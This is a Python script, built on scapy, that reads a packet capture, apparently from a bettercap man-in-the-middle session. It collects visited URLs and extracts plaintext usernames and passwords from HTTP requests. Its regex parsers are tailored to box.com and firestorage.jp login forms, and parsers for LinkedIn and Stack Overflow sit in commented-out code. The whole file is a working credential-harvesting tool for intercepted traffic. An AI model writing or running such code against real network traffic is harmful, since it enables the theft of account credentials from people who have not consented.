import scapy.all as scapy
from scapy.layers import http
import re, os
import urllib.parse
from collections import defaultdict

FILE_PATH = os.path.dirname(os.path.abspath(__file__)) + "/bettercap_file/login_info.pcap"

url_list = []
user_list = []
password_list = []

def sniff():
    scapy.sniff(offline=FILE_PATH, store=False, prn=process_sniffed_packet, timeout=6000)
    print("[-] sniff stop...")
    return set(url_list), user_list, password_list

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        print(load)
        keywords = ["username", "user", "login", "password", "pass", "uname","email", ]
        for keyword in keywords:
            if keyword in str(load):
                print(load)
                return load

def get_box_login_info(login_info):
    userid = re.findall(r"login=(.*?)(?=&)", login_info)
    password = re.findall(r"password=(.*?)(?=&)", login_info)
    login_info = userid + password
    try:
        login_info[0] = urllib.parse.unquote(login_info[0])
        login_info[1] = urllib.parse.unquote(login_info[1])
        
        user_list.append(login_info[0])
        password_list.append(login_info[1])
    except IndexError:
        pass
    return login_info

def get_firestorage_login_info(login_info):
    userid = re.findall(r"mail=(.*?)(?=&)", login_info)
    password = re.findall(r"pw=(.*?)(?=&)", login_info)
    login_info = userid + password
    try:
        login_info[0] = urllib.parse.unquote(login_info[0])
        login_info[1] = urllib.parse.unquote(login_info[1])
        
        user_list.append(login_info[0])
        password_list.append(login_info[1])
    except IndexError:
        pass
    return login_info

# def get_linkedin_login_info(login_info):
#     userid = re.findall(r"session_key=(.*?)(?=&)", login_info)
#     pass_reg = re.findall(r"session_password=(.*?)(?=')", login_info)
#     return id_reg, pass_reg

# def get_stackoverflow_login_info(login_info):
#     email = re.findall(r"email=(.*?)(?=&)", login_info)
#     password = re.findall(r"password=(.*?)(?=&)", login_info)
#     return email + password

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet).decode()
        # print("[+] HTTP Request >>" + url)
        url_list.append(url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + str(login_info) + "\n\n")

        # if "linkedin.com" in url:
        #     login_info = get_linkedin_login_info(str(login_info))
        #     if login_info:
        #         print(','.join(login_info))

        # if "stackoverflow.com" in url:
        #     login_info = get_stackoverflow_login_info(str(login_info))
        #     if login_info:
        #         print(login_info)
        if "box.com" in url:
            print(packet[http.HTTPRequest].Referer)
            login_info = get_box_login_info(str(packet[http.HTTPRequest].Referer))

        if "firestorage.jp" in url:
            login_info = get_firestorage_login_info(str(login_info))
            # if login_info:
            #     print(login_info)
                
# urllist, user_list, password_list = sniff()
# print(set(user_list))
# print(set(password_list))